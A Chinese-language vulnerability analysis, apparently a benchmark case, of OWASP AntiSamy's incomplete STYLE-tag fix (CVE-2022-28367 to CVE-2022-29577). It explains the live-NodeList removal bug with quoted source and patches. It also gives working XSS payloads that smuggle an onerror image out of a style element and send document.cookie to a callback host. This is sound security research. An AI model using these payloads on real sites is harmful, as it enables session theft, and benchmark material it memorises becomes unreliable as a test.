# AntiSamy：style 子节点删了一半，活节点还在序列化里

- Case：`PCBV2-0066`
- 产品：OWASP AntiSamy（Java HTML/CSS 消毒器；应用把 `scan().getCleanHTML()` 写进页面）
- 链：CVE-2022-28367（1.6.5 → 1.6.6，commit `0199e7e194`）→ CVE-2022-29577（→ 1.6.7，commit `32e273507da0e964b58c50fd8a4c94c9d9363af0`）
- 源码对着 GitHub tag `v1.6.5` / `v1.6.6` / `v1.6.7` 的 `AntiSamyDOMScanner.java::processStyleTag`。运行时是 Maven 整包 `org.owasp.antisamy:antisamy` + 库存 `antisamy.xml`（允许 `<style>`），不是抽出来的扫描函数。

2022 年 4 月 2 日，AntiSamy 1.6.6 改了 STYLE 处理：不再只扫 `firstChild` 的文本，而是把所有子节点的 `getTextContent()` 拼起来交给 CSS 扫描，然后用一个正向循环 `removeChild` 清掉「多余」孩子。这挡住了单个走私子节点。八天后 1.6.7 的 release notes 自己说 *our fix had a minor bug that allowed something to sneak through*。NVD CVE-2022-29577 写明 *this issue exists because of an incomplete fix for CVE-2022-28367*。

根因不只是「循环写反了」。检查插在 DOM 子节点列表上；真正执行脚本的是浏览器把**未编码**的序列化 HTML 当成标签解析之后。W3C DOM 的 `NodeList` 是 live 的，正向删除会跳过节点。下面按请求走进去、1.6.6 改了哪几行、删完之后谁把节点写进输出、为什么两个孩子里会留下一个，把这几层写完。

---

## 这块功能本来在干什么

AntiSamy 给 Java 应用提供一份可配策略的 HTML 白名单。典型用法：用户提交的富文本进 `AntiSamy.scan(html, policy, AntiSamy.DOM)`，`getCleanHTML()` 再写进响应。库存 `antisamy.xml` 允许 `<style>`，因为合法页面要带 CSS。

本 case 的应用把查询参数交给真实 sanitizer，再把干净 HTML 交给无头 Chromium。一次典型请求：

```http
GET /?html=<style>b { color: red }</style>
```

受害者浏览器带着 `Cookie: session=<PCBFLAG_...>` 加载这份消毒后的页面。成功穿越之后的效果是：**输出里仍有 `</style>` 提前闭合 + 活的 `<img onerror>`**，脚本读 `document.cookie` 打到内部 callback。flag 只在 callback dump 里出现，证明是真的脚本执行，不是反射字符串本身。

数据流：

```text
HTTP ?html=
    → AntiSamy.scan(..., DOM)
         Neko/HtmlUnit 解析成 DOM
         遇到 <style> → processStyleTag(ele)
              V0：只把 firstChild 当 CSS 文本扫，其它孩子不动
              V1：拼所有孩子的 textContent 当 CSS 扫
                  然后 for i=1; i<getLength(); i++ removeChild(item(i))
              序列化 ele → 输出 HTML
    → 页面 <style>...</style> 原样进浏览器
         若子节点里还有 </style><img onerror>，浏览器提前关 style，执行 img
    → onerror 读 cookie，beacon 到 callback
```

没有登录。判断完全信任 sanitizer 的 DOM；不信任浏览器稍后怎么重解析同一段序列化文本。

---

## 原始漏洞：只扫第一个孩子（CVE-2022-28367，1.6.5）

1.6.5 的 `processStyleTag` 假定 `<style>` 里只有一个文本节点：

```java
// AntiSamyDOMScanner.java :: processStyleTag  (v1.6.5，patch.diff 的 "-" 侧)
            Node firstChild = ele.getFirstChild();
            if (firstChild != null) {
                String toScan = firstChild.getNodeValue();
                CleanResults cr = styleScanner.scanStyleSheet(toScan, policy.getMaxInputSize());
                ...
                if (cleanHTML == null || cleanHTML.equals("")) {
                    firstChild.setNodeValue("/* */");
                } else {
                    firstChild.setNodeValue(cleanHTML);
                }
            }
```

Neko 遇到 `<style/>b<![cdata[</style><img ...>` 这种写法时，会把「CSS 文本」和「走私进来的元素/注释」拆成**多个**子节点。`scanStyleSheet` 只看见第一个孩子的文本；后面那个带着 `</style><img onerror>` 的节点从未进 CSS 扫描，也从未被删。序列化器按 DOM 原样吐出，浏览器在 style 内容里看到字面 `</style>`，提前闭合，后面的 `<img>` 变成活动节点。

本 case 的 seed（观察到的 payload，与 `original_poc.py` 一致）：

```text
<style/>b<![cdata[</style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">
```

`<![cdata[` 这份假注释让 `</style><img onerror>` 在解析阶段保持为**原始文本**（若被解析成真正的元素，neko 会丢掉 `onerror`）。V0 只有一个走私孩子，它活着进输出，Chromium 执行 onerror，callback 里出现 `PCBFLAG_...`。

---

## 维护者改了什么（CVE-2022-28367 修复，1.6.6）

commit `0199e7e194dba5e7d7197703f43ebe22401e61ae` 动的是同一函数。对着 GitHub tag `v1.6.6` 原文：

```java
// src/main/java/org/owasp/validator/html/scan/AntiSamyDOMScanner.java
// :: processStyleTag  (tag v1.6.6)
            if (ele.getChildNodes().getLength() > 0) {
                StringBuffer toScan = new StringBuffer();

                for (int i = 0; i < ele.getChildNodes().getLength(); i++) {
                    Node childNode = ele.getChildNodes().item(i);
                    if (toScan.length() > 0) {
                        toScan.append("\n");
                    }
                    toScan.append(childNode.getTextContent());
                }

                CleanResults cr = styleScanner.scanStyleSheet(toScan.toString(), policy.getMaxInputSize());
                ...
                String cleanHTML = cr.getCleanHTML();
                cleanHTML = cleanHTML == null || cleanHTML.equals("") ? "/* */" : cleanHTML;

                ele.getFirstChild().setNodeValue(cleanHTML);
                /*
                 * Remove every other node after cleaning CSS, there will
                 * be only one node in the end, as it always should have.
                 */
                for (int i = 1; i < ele.getChildNodes().getLength(); i++) {
                    Node childNode = ele.getChildNodes().item(i);
                    ele.removeChild(childNode);
                }
            }
```

注释写 *Remove every other node*——作者本意是「其余节点」，英文却碰巧说成了「每隔一个」。实现也真的每隔一个才删。

对 seed 这种**单个**额外孩子，它确实够用：

```text
孩子:  [0]=CSS 文本    [1]=走私的 </style><img...>
循环 i=1：removeChild(item(1)) → 走私节点没了
序列化: <style>/* 干净 CSS */</style>   无 img
```

浏览器看不到 breakout，callback 没有金丝雀。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 拼完 textContent 再扫 CSS，走私文本就不会漏过扫描器。
2. 从下标 1 正向 `removeChild`，最后一定只剩一个孩子。

第二点不成立。`ele.getChildNodes()` 返回的是 **live NodeList**（DOM Level 2 Core）：删掉 `item(i)` 后，后面的节点立刻前移，`getLength()` 变小，`i++` 却照样加。于是大约每隔一个孩子被跳过。

扫描那一步其实已经看见了所有文本；真正放行的是**删除循环之后仍留在树上、被序列化器原样写出的节点**。CSS 扫描并不能把 DOM 元素变成文本。

---

## 消毒之后，谁真正写出那个节点

`processStyleTag` 返回后，扫描器继续 `processChildren` / 序列化整棵树。STYLE 的子节点**不会**再走一遍标签白名单：它们被当成「已经当 CSS 处理过的内容」。序列化器对元素孩子按 HTML 规则输出开始标签和属性，**不**做 HTML 编码。

所以：

- `setNodeValue(cleanHTML)` 只改了**第一个**孩子（通常是文本节点）
- 没删掉的后续孩子如果是 Element，序列化就是活标签
- 如果是仍含 `</style>` 的文本/注释，浏览器会在 style 内容里提前闭合

过滤器刚看过的是「子节点个数 + CSS 扫描」；浏览器看到的是序列化后的字节。两套语义中间没有「输出里禁止 `</style>`」或「style 只许一个文本节点」的第二次谓词。

本 case 的 oracle 是无头 Chromium，不是字符串匹配 `onerror`。V1 上 seed 的单节点被删，页面里没有活 img，callback 空。这和「输出字符串里碰巧没有 onerror 子串」不是一回事：残余会让**另一个下标**的节点活着出来。

---

## 仓库里已经有更强的做法，删除循环没用上

同一函数里，维护者已经：

1. 用 `getTextContent()` 把所有孩子折成一份 CSS（承认「不止一个孩子」）
2. 把干净 CSS 写回 `firstChild`

要把树收成「永远只有一个文本节点」，更直接的写法是：在改 `firstChild` 之后，**先记下 length，再反向删**，或者删光再 `appendChild` 一个文本节点。1.6.7 选了前者。1.6.6 选了正向 live 循环。

谁在用哪种删除：

| 版本 | 删除 | 单走私孩子 | 两走私孩子 |
|---|---|---|---|
| 1.6.5 | 不删 | 活着进输出 | 活着 |
| 1.6.6 | `for (i=1; i<length; i++) remove` | 删掉 | **偶数下标留下** |
| 1.6.7 | 先 `childNodesCount=length`，再 `for (i=count-1; i>=1; i--)` | 删掉 | 全删 |

不是仓库里没有「删干净」的意图——注释写了 *only one node in the end*——是 **live NodeList 上的正向循环实现不了这句注释**。

即便没有 `<b></b>` 把危险节点推到偶数下标，只要删除循环继续正向改 live 列表，三个及以上走私孩子也会留下一部分。

---

## 这个补丁挡住了什么、没挡住什么

正向 live 删除的逐步状态（下标从 0）：

```text
初始:     [0 文本] [1 扔掉的 <b>] [2 走私 </style><img>]     length=3
i=1:      remove item(1)=<b>
          现在: [0 文本] [1 走私]                              length=2
          i++ → 2
i=2:      2 < length(2)？否，循环结束
留下:     [0 文本] [1 走私 </style><img>]
```

seed 没有那个 `<b></b>`，初始 length=2，`i=1` 正好删掉唯一的走私节点。residual 只多一个扔弃元素，危险节点从下标 1 变成下标 2，循环永远碰不到它。

token 变换：

```text
seed:     <style/>b<![cdata[</style><img onerror=...>
          Neko 孩子 ≈ 2 个；V1 删掉 index 1 → 无 breakout

residual: <style/>a<b></b><![cdata[</style><img onerror=...>
          Neko 孩子 ≈ 3 个；V1 删掉 index 1（<b>），跳过 index 2
          序列化仍含 </style><img onerror>
          浏览器关 style，执行 img，cookie → callback
```

NVD 说 output serializer 没有 properly encode supposed CSS content——序列化器并不是另写一套编码器，它只是把 **processStyleTag 没删掉的孩子**原样写出去。不完整点在删除循环，不在 CSS 扫描。

---

## 残余仍然走同一条 scan → 页面 → onerror 路径（CVE-2022-29577）

没有换 API、没有换策略文件、没有换 cookie。还是：

```http
GET /?html=<style/>a<b></b><![cdata[</style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">
```

`processStyleTag` 仍然拼接 textContent、仍然跑那行正向 `removeChild`。跑完之后走私节点还在树上；序列化进页面；Chromium 执行 onerror；callback 出现 `session=PCBFLAG_...`。

held-out 把 delta 写死为「seed 前面插一个 `<b></b>`」。AntiSamy 1.6.7 回归测试 `testSmuggledTagsInStyleContent` 用的是同类 STYLE 走私（`"<style/>b<![cdata[</style>..."` 以及 `"<select<style/>W<xmp<script>..."`）。认证记录（case.json live-regate，**本分析未重新 compose**）：v1 + residual 在 callback 观察到 flag。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：删除语言比 DOM live 语义窄；序列化发生在删除之后且不再编码；「只留一个孩子」的意图没有用 snapshot+反向或重建文本节点来实现。seed 被挡住只说明「一个额外孩子没了」，不说明「style 里不能再走私活动节点」。

---

## 后来又补了什么（CVE-2022-29577，1.6.7）

commit `32e273507da0e964b58c50fd8a4c94c9d9363af0` 把循环改成先拍照再反向。1.6.7 release notes：*addresses a minor issue in the security fixes implemented in 1.6.6*。NVD：*incomplete fix for CVE-2022-28367*。

```java
// AntiSamyDOMScanner.java :: processStyleTag  (v1.6.7，held-out / 公开 commit)
                int childNodesCount = ele.getChildNodes().getLength();
                for (int i = childNodesCount - 1; i >= 1; i--) {
                    ele.removeChild(ele.getChildNodes().item(i));
                }
```

对残余输入：从尾巴删到下标 1，`<b>` 和走私节点都被拿掉，只剩带干净 CSS 的第一个孩子。浏览器看不到 breakout。公开建议是升级到 1.6.7（OWASP 项目页写 *update AntiSamy to 1.6.7 or later to additionally avoid CVE-2022-28367 and CVE-2022-29577*）。

即便如此，这仍然是「删子节点」，不是「序列化时对 style 内容做 HTML 编码」。对「多节点 + live 正向循环」这条已知链它够用。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 `processStyleTag` 里「扫哪些文本、删哪些孩子」。真正执行脚本的是浏览器对序列化 HTML 的再解析。V2 仍在同一层把循环写对，没有在序列化出口禁止 `</style>` 或强制 style 只有一个文本节点。

**不是没有更好的谓词。**  
「先取 length 再反向删」是 DOM 教科书写法。注释已经要求只留一个节点。从 V1 的 diff 只能看到「开始扫所有孩子 + 加了删除循环」；要判断补丁是否闭合，必须看到 `NodeList` 是 live 的，以及两个孩子时循环的下标轨迹。

**同一函数、同一 `<style>`，只换了孩子个数。**  
任何允许 `<style>` 的策略在 1.6.6 上都吃这一段循环。seed 和 residual 的唯一差别是一个扔弃的 `<b></b>`。

**CSS 扫描看见了文本，并不等于 DOM 里没有元素。**  
`getTextContent()` 会把元素孩子折成字符串送进 Batik；元素节点本身还在树上。扫描通过 ≠ 节点被替换成文本。

**金丝雀在 cookie 里、不在 HTML 里是有意的。**  
callback 出现 `PCBFLAG_...` 说明 onerror 真的跑了，不是 sanitizer 把 payload 原样回显。

---

## 版本、入口、参考

| | AntiSamy | `processStyleTag` | 单走私孩子 seed | 双走私孩子 residual |
|---|---|---|---|---|
| V0 | 1.6.5 | 只扫 `firstChild`，不删 | callback 有 flag | （不必） |
| V1 | 1.6.6 | 拼 textContent + 正向 live `removeChild` | 走私节点被删 | 偶数下标留下，callback 有 flag |
| V2 | 1.6.7 | snapshot length + 反向删 | 挡 | 挡 |

- Web：`GET /?html=...`（消毒后页面由 headless Chromium 加载）
- 认证记录（case.json）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到；v2 residual 未观察到。
- [CVE-2022-28367](https://nvd.nist.gov/vuln/detail/CVE-2022-28367)、[CVE-2022-29577](https://nvd.nist.gov/vuln/detail/CVE-2022-29577)
- [v1.6.6 发布说明](https://github.com/nahsra/antisamy/releases/tag/v1.6.6)、[v1.6.7 发布说明](https://github.com/nahsra/antisamy/releases/tag/v1.6.7)（后者承认 1.6.6 *minor bug*）
- V1 源码：[tag v1.6.6 `AntiSamyDOMScanner.java`](https://github.com/nahsra/antisamy/blob/v1.6.6/src/main/java/org/owasp/validator/html/scan/AntiSamyDOMScanner.java) `processStyleTag`
- V1 补丁：[commit `0199e7e194`](https://github.com/nahsra/antisamy/commit/0199e7e194dba5e7d7197703f43ebe22401e61ae)
- V2 补丁：[commit `32e273507`](https://github.com/nahsra/antisamy/commit/32e273507da0e964b58c50fd8a4c94c9d9363af0)
- OWASP：[请升级到 1.6.7+](https://owasp.org/www-project-antisamy/)
